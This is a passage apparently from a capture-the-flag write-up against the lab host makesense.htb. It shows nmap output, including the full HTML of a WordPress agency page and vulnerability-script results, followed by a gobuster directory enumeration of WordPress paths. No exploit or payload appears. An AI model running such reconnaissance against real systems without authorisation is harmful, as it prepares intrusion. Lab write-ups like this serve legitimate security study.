:where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}
|   
|   /*# sourceURL=/wp-includes/css/dist/block-library/common.min.css */
|   </style>
|   <style id="classic-theme-styles-inline-css">
|   /*! This file is auto-generated */
|   .wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
|   /*# sourceURL=/wp-includes/css/classic-themes.min.css */
|   </style>
|   
|   <style id="global-styles-inline-css">
|   :root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(body) { margin: 0; }:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;font-style: inherit;font-weight: inherit;letter-spacing: inherit;line-height: inherit;padding-top: calc(0.667em + 2px);padding-right: calc(1.333em + 2px);padding-bottom: calc(0.667em + 2px);padding-left: calc(1.333em + 2px);text-decoration: none;text-transform: inherit;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
|   /*# sourceURL=global-styles-inline-css */
|   </style>
|   
|   <link rel='stylesheet' id='tailwind-css' href='https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css?ver=7.0' media='all' />
|   <link rel='stylesheet' id='webagency-style-css' href='https://makesense.htb/wp-content/themes/webagency/style.css?ver=7.0' media='all' />
|   <link rel='stylesheet' id='webagency-custom-css' href='https://makesense.htb/wp-content/themes/webagency/assets/css/custom.css?ver=7.0' media='all' />
|   <link rel='stylesheet' id='swiper-css' href='https://cdn.jsdelivr.net/npm/swiper@8/swiper-bundle.min.css?ver=7.0' media='all' />
|   <script id="jquery-core-js" src="https://makesense.htb/wp-includes/js/jquery/jquery.min.js?ver=3.7.1"></script>
|   <script id="jquery-migrate-js" src="https://makesense.htb/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1"></script>
|   <link rel="https://api.w.org/" href="https://makesense.htb/index.php?rest_route=/" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://makesense.htb/xmlrpc.php?rsd" />
|   <meta name="generator" content="WordPress 7.0" />
|   </head>
|   <body class="home blog wp-theme-webagency">
|   
|   <header class="fixed w-full z-50 bg-white shadow-md">
|       <nav class="container mx-auto px-6 py-4">
|           <div class="flex items-center justify-between">
|               <div class="text-2xl font-bold text-blue-600">
|                   <a href="https://makesense.htb">WebAgency</a>
|               </div>
|               <div class="hidden md:flex space-x-8">
|                   <a href="#home" class="text-gray-700 hover:text-blue-600 transition">Home</a>
|                   <a href="#cases" class="text-gray-700 hover:text-blue-600 transition">Cases</a>
|                   <a href="#team" class="text-gray-700 hover:text-blue-600 transition">Team</a>
|                   <a href="#contact" class="text-gray-700 hover:text-blue-600 transition">Contact</a>
|               </div>
|               <div class="md:hidden">
|                   <button id="mobile-menu-btn" class="text-gray-700">
|                       <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
|                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/>
|                       </svg>
|                   </button>
|               </div>
|           </div>
|           <div id="mobile-menu" class="hidden md:hidden mt-4">
|               <a href="#home" class="block py-2 text-gray-700 hover:text-blue-600">Home</a>
|               <a href="#cases" class="block py-2 text-gray-700 hover:text-blue-600">Cases</a>
|               <a href="#team" class="block py-2 text-gray-700 hover:text-blue-600">Team</a>
|               <a href="#contact" class="block py-2 text-gray-700 hover:text-blue-600">Contact</a>
|           </div>
|       </nav>
|   </header>
|   
|   <!-- Hero Section -->
|   <section id="home" class="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-500 to-purple-600 text-white pt-20">
|       <div class="container mx-auto px-6 text-center">
|           <h1 class="text-5xl md:text-7xl font-bold mb-6 animate-fade-in">
|               We Build Digital Experiences
|           </h1>
|           <p class="text-xl md:text-2xl mb-8 text-blue-100">
|               Transform your business with cutting-edge web solutions
|           </p>
|           <div class="flex flex-col sm:flex-row gap-4 justify-center">
|               <a href="#contact" class="bg-white text-blue-600 px-8 py-4 rounded-full font-semibold hover:bg-blue-50 transition transform hover:scale-105">
|                   Get Started
|               </a>
|               <a href="#cases" class="border-2 border-white text-white px-8 py-4 rounded-full font-semibold hover:bg-white hover:text-blue-600 transition transform hover:scale-105">
|                   View Our Work
|               </a>
|           </div>
|       </div>
|   </section>
|   
|   <!-- Cases Section -->
|   <section id="cases" class="py-20 bg-gray-50">
|       <div class="container mx-auto px-6">
|           <div class="text-center mb-16">
|               <h2 class="text-4xl md:text-5xl font-bold text-gray-900 mb-4">Our Cases</h2>
|               <p class="text-xl text-gray-600">Successful projects we're proud of</p>
|           </div>
|   
|           <div class="swiper casesSwiper">
|               <div class="swiper-wrapper">
|                                       <!-- Default cases if none exist -->
|                       <div class="swiper-slide">
|                           <div class="bg-white rounded-lg shadow-lg overflow-hidden">
|                               <div class="h-64 overflow-hidden">
|                                   <img src="https://images.unsplash.com/photo-1557821552-17105176677c?w=800&h=600&fit=crop" alt="E-Commerce Platform" class="w-full h-full object-cover">
|                               </div>
|                               <div class="p-6">
|                                   <h3 class="text-2xl font-bold text-gray-900 mb-3">E-Commerce Platform</h3>
|                                   <p class="text-gray-600">Built a scalable e-commerce solution handling 100K+ daily transactions with seamless user experience.</p>
|                               </div>
|                           </div>
|                       </div>
|                       <div class="swiper-slide">
|                           <div class="bg-white rounded-lg shadow-lg overflow-hidden">
|                               <div class="h-64 overflow-hidden">
|                                   <img src="https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=600&fit=crop" alt="SaaS Dashboard" class="w-full h-full object-cover">
|                               </div>
|                               <div class="p-6">
|                                   <h3 class="text-2xl font-bold text-gray-900 mb-3">SaaS Dashboard</h3>
|                                   <p class="text-gray-600">Developed an intuitive analytics dashboard for a B2B SaaS company, improving user engagement by 200%.</p>
|                               </div>
|                           </div>
|                       </div>
|                       <div class="swiper-slide">
|                           <div class="bg-white rounded-lg shadow-lg overflow-hidden">
|                               <div class="h-64 overflow-hidden">
|                                   <img src="https://images.unsplash.com/photo-1563986768609-322da13575f3?w=800&h=600&fit=crop" alt="Mobile Banking App" class="w-full h-full object-cover">
|                               </div>
|                               <div class="p-6">
|                                   <h3 class="text-2xl font-bold text-gray-900 mb-3">Mobile Banking App</h3>
|                                   <p class="text-gray-600">Created a secure and user-friendly mobile banking application with biometric authentication.</p>
|                               </div>
|                           </div>
|                       </div>
|                       <div class="swiper-slide">
|                           <div class="bg-white rounded-lg shadow-lg overflow-hidden">
|                               <div class="h-64 overflow-hidden">
|                                   <img src="https://images.unsplash.com/photo-1576091160399-112ba8d25d1d?w=800&h=600&fit=crop" alt="Healthcare Portal" class="w-full h-full object-cover">
|                               </div>
|                               <div class="p-6">
|                                   <h3 class="text-2xl font-bold text-gray-900 mb-3">Healthcare Portal</h3>
|                                   <p class="text-gray-600">Designed a HIPAA-compliant patient portal connecting healthcare providers and patients seamlessly.</p>
|                               </div>
|                           </div>
|                       </div>
|                               </div>
|               <div class="swiper-pagination mt-8"></div>
|               <div class="swiper-button-next"></div>
|               <div class="swiper-button-prev"></div>
|           </div>
|       </div>
|   </section>
|   
|   <!-- Team Section -->
|   <section id="team" class="py-20 bg-white">
|       <div class="container mx-auto px-6">
|           <div class="text-center mb-16">
|               <h2 class="text-4xl md:text-5xl font-bold text-gray-900 mb-4">Our Team</h2>
|               <p class="text-xl text-gray-600">Meet the talented people behind our success</p>
|           </div>
|   
|           <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
|                               <!-- Default team members if none exist -->
|                   <div class="text-center group">
|                       <div class="relative mb-4 overflow-hidden rounded-lg">
|                           <img src="https://i.pravatar.cc/400?img=12" alt="John Smith" class="w-full h-80 object-cover transform group-hover:scale-110 transition duration-300">
|                       </div>
|                       <h3 class="text-xl font-bold text-gray-900 mb-1">John Smith</h3>
|                       <p class="text-blue-600 font-semibold">CEO & Founder</p>
|                   </div>
|                   <div class="text-center group">
|                       <div class="relative mb-4 overflow-hidden rounded-lg">
|                           <img src="https://i.pravatar.cc/400?img=45" alt="Sarah Johnson" class="w-full h-80 object-cover transform group-hover:scale-110 transition duration-300">
|                       </div>
|                       <h3 class="text-xl font-bold text-gray-900 mb-1">Sarah Johnson</h3>
|                       <p class="text-blue-600 font-semibold">Lead Designer</p>
|                   </div>
|                   <div class="text-center group">
|                       <div class="relative mb-4 overflow-hidden rounded-lg">
|                           <img src="https://i.pravatar.cc/400?img=33" alt="Michael Chen" class="w-full h-80 object-cover transform group-hover:scale-110 transition duration-300">
|                       </div>
|                       <h3 class="text-xl font-bold text-gray-900 mb-1">Michael Chen</h3>
|                       <p class="text-blue-600 font-semibold">Tech Lead</p>
|                   </div>
|                   <div class="text-center group">
|                       <div class="relative mb-4 overflow-hidden rounded-lg">
|                           <img src="https://i.pravatar.cc/400?img=47" alt="Emily Davis" class="w-full h-80 object-cover transform group-hover:scale-110 transition duration-300">
|                       </div>
|                       <h3 class="text-xl font-bold text-gray-900 mb-1">Emily Davis</h3>
|                       <p class="text-blue-600 font-semibold">Marketing Director</p>
|                   </div>
|                       </div>
|       </div>
|   </section>
|   
|   <!-- Contact Section -->
|   <section id="contact" class="py-20 bg-gray-50">
|       <div class="container mx-auto px-6">
|           <div class="text-center mb-16">
|               <h2 class="text-4xl md:text-5xl font-bold text-gray-900 mb-4">Get In Touch</h2>
|               <p class="text-xl text-gray-600">Let's discuss your next project</p>
|           </div>
|   
|           <div class="max-w-2xl mx-auto">
|               <form id="contactForm" class="bg-white rounded-lg shadow-lg p-8">
|                   <div class="mb-6">
|                       <label for="name" class="block text-gray-700 font-semibold mb-2">Name</label>
|                       <input type="text" id="name" name="name" required
|                              class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500">
|                   </div>
|   
|                   <div class="mb-6">
|                       <label for="email" class="block text-gray-700 font-semibold mb-2">Email</label>
|                       <input type="email" id="email" name="email" required
|                              class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500">
|                   </div>
|   
|                   <div class="mb-6">
|                       <label for="phone" class="block text-gray-700 font-semibold mb-2">Phone</label>
|                       <input type="tel" id="phone" name="phone"
|                              class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500">
|                   </div>
|   
|                   <div class="mb-6">
|                       <label for="message" class="block text-gray-700 font-semibold mb-2">Message</label>
|                       <textarea id="message" name="message" rows="5" required
|                                 class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500"></textarea>
|                   </div>
|   
|                   <button type="submit"
|                           class="w-full bg-blue-600 text-white px-8 py-4 rounded-lg font-semibold hover:bg-blue-700 transition">
|                       Send Message
|                   </button>
|   
|                   <div id="formMessage" class="mt-6 hidden"></div>
|               </form>
|           </div>
|       </div>
|   </section>
|   
|   <!-- Floating Call Button -->
|   <button id="floatingCallBtn" class="floating-call-btn">
|       <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
|           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"/>
|       </svg>
|   </button>
|   
|   <!-- Call Modal -->
|   <div id="callModal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center z-50">
|       <div class="bg-white rounded-lg p-8 max-w-md w-full mx-4">
|           <div class="text-center">
|               <div class="mb-6">
|                   <div class="w-20 h-20 bg-green-100 rounded-full mx-auto flex items-center justify-center mb-4">
|                       <svg class="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
|                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"/>
|                       </svg>
|                   </div>
|                   <h3 class="text-2xl font-bold text-gray-900 mb-2">Call WebAgency</h3>
|                   <p id="callStatus" class="text-gray-600 mb-4">Ready to connect</p>
|               </div>
|   
|               <div id="recordingControls" class="hidden">
|                   <div class="mb-4">
|                       <div class="flex items-center justify-center gap-2 text-red-600">
|                           <span class="w-3 h-3 bg-red-600 rounded-full animate-pulse"></span>
|                           <span class="font-semibold">Recording...</span>
|                       </div>
|                       <p class="text-sm text-gray-500 mt-2">Speak your message after the beep</p>
|                   </div>
|               </div>
|   
|               <div id="modalButtons">
|                   <button id="startCallBtn" class="bg-green-600 text-white px-8 py-3 rounded-full font-semibold hover:bg-green-700 transition mb-3 w-full">
|                       Call
|                   </button>
|                   <button id="closeModalBtn" class="text-gray-600 hover:text-gray-800 font-semibold">
|                       Cancel
|                   </button>
|               </div>
|   
|               <button id="hangupBtn" class="hidden bg-red-600 text-white px-8 py-3 rounded-full font-semibold hover:bg-red-700 transition">
|                   Hang Up
|               </button>
|           </div>
|       </div>
|   </div>
|   
|   <footer class="bg-gray-900 text-white py-12">
|       <div class="container mx-auto px-6">
|           <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
|               <div>
|                   <h3 class="text-2xl font-bold mb-4">WebAgency</h3>
|                   <p class="text-gray-400">Creating exceptional digital experiences for businesses worldwide.</p>
|               </div>
|               <div>
|                   <h4 class="text-lg font-semibold mb-4">Quick Links</h4>
|                   <ul class="space-y-2">
|                       <li><a href="#home" class="text-gray-400 hover:text-white transition">Home</a></li>
|                       <li><a href="#cases" class="text-gray-400 hover:text-white transition">Cases</a></li>
|                       <li><a href="#team" class="text-gray-400 hover:text-white transition">Team</a></li>
|                       <li><a href="#contact" class="text-gray-400 hover:text-white transition">Contact</a></li>
|                   </ul>
|               </div>
|               <div>
|                   <h4 class="text-lg font-semibold mb-4">Contact Info</h4>
|                   <ul class="space-y-2 text-gray-400">
|                       <li>Email: info@webagency.com</li>
|                       <li>Phone: +1 (555) 123-4567</li>
|                       <li>Address: 123 Digital St, Tech City</li>
|                   </ul>
|               </div>
|           </div>
|           <div class="border-t border-gray-800 mt-8 pt-8 text-center text-gray-400">
|               <p>&copy; 2026 WebAgency. All rights reserved.</p>
|           </div>
|       </div>
|   </footer>
|   
|   <script id="swiper-js" src="https://cdn.jsdelivr.net/npm/swiper@8/swiper-bundle.min.js?ver=8.0"></script>
|   <script id="whisper-wrapper-js-extra">
|   var webagency_ajax = {"ajax_url":"https://makesense.htb/wp-admin/admin-ajax.php","nonce":"3ce2abcc98","theme_url":"https://makesense.htb/wp-content/themes/webagency","site_url":"https://makesense.htb"};
|   //# sourceURL=whisper-wrapper-js-extra
|   </script>
|   <script id="whisper-wrapper-js" src="https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js?ver=1.0"></script>
|   <script id="webagency-main-js" src="https://makesense.htb/wp-content/themes/webagency/assets/js/main.js?ver=1.0"></script>
|   <script id="wp-emoji-settings" type="application/json">
|   {"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://makesense.htb/wp-includes/js/wp-emoji-release.min.js?ver=7.0"}}
|   </script>
|   <script type="module">
|   /*! This file is auto-generated */
|   const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(window._wpemojiSettings=a,"wpEmojiSettingsSupports"),s=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const a=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===a[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,a){let r;const o=(r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),s=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(e=>{s[e]=t(o,e,n,a)}),s}function r(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}a.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),c.toString(),p.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"});const r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=e=>{i(n=e.data),r.terminate(),t(n)})}catch(e){}i(n=f(s,u,c,p))}t(n)}).then(e=>{for(const n in e)a.supports[n]=e[n],a.supports.everything=a.supports.everything&&a.supports[n],"flag"!==n&&(a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&a.supports[n]);var t;a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&!a.supports.flag,a.supports.everything||((t=a.source||{}).concatemoji?r(t.concatemoji):t.wpemoji&&t.twemoji&&(r(t.twemoji),r(t.wpemoji)))});
|   //# sourceURL=https://makesense.htb/wp-includes/js/wp-emoji-loader.min.js
|   </script>
|   </body>
|   </html>
|   
|     References:
|       http://www.exploit-db.com/exploits/1244/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
8001/tcp filtered vcom-tunnel
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.86 seconds

 
```


![[Pasted image 20260809004540.png]]




```

(root㉿kali)-[/home/kali/Desktop/HTB]
└─# gobuster dir -u https://makesense.htb -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -x php,txt,zip,bak -t 50 -k --exclude-length 0
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://makesense.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              bak,php,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
license.txt          (Status: 200) [Size: 19903]
readme.html          (Status: 200) [Size: 7406]
wp-admin/.php        (Status: 403) [Size: 279]
wp-admin/admin-ajax.php (Status: 400) [Size: 1]
wp-admin/admin-footer.php (Status: 200) [Size: 2]
wp-admin/admin-functions.php (Status: 200) [Size: 2]
wp-admin/admin-header.php (Status: 200) [Size: 2]
wp-admin/css/        (Status: 200) [Size: 22666]
wp-admin/css/.php    (Status: 403) [Size: 279]
wp-admin/css/color-picker-rtl.css (Status: 200) [Size: 3957]
wp-admin/css/color-picker-rtl.min.css (Status: 200) [Size: 3201]
wp-admin/css/color-picker.css (Status: 200) [Size: 3919]
wp-admin/css/color-picker.min.css (Status: 200) [Size: 3198]
wp-admin/css/customize-controls-rtl.min.css (Status: 200) [Size: 60473]
